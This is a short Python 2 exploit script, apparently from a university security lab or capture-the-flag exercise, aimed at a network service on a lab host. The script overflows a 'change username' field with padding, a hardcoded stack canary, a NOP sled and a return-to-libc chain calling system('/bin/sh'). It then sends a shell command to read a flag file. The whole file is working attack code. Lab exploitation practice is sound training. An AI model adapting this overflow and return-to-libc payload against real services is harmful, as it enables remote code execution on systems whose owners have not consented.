import struct
import socket
import time

canaries = '\xBC\xAD\xB8\xA8'
fillerNopSleds = '\x90' * 20
login = 'cs19m050:cs19m050' + '\n'
libcBase = int("0xB75b3000", 16)
#cmd = 'ls -l'
cmd = 'cat cs19m050_flag.txt'

system = libcBase + 0x3ab40
exit = libcBase + 0x2e7f0
binsh = libcBase + 0x15cdc8

r2libc = struct.pack('<L', system)
r2libc += struct.pack('<L', exit)
r2libc += struct.pack('<L', binsh)

buffer = 'A' * 128 + canaries + fillerNopSleds + r2libc

IP_FH = '10.105.21.174'
IP_MARTIN = '10.0.2.22'
IP = IP_FH
PORT = 8080
BUFFER_SIZE = 2048

# connection establishment
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((IP, PORT))

# login to the application
s.send(login)
res2 = s.recv(BUFFER_SIZE)

time.sleep(0.02)

# sending buffer to change username vulnerability
s.send('u ' + buffer + '\n')
res3 = s.recv(BUFFER_SIZE)

# sending cmd which should be executed
s.send(cmd + '\n')

#response of cmd
res4 = s.recv(BUFFER_SIZE)
print "Response: " + res4

s.close()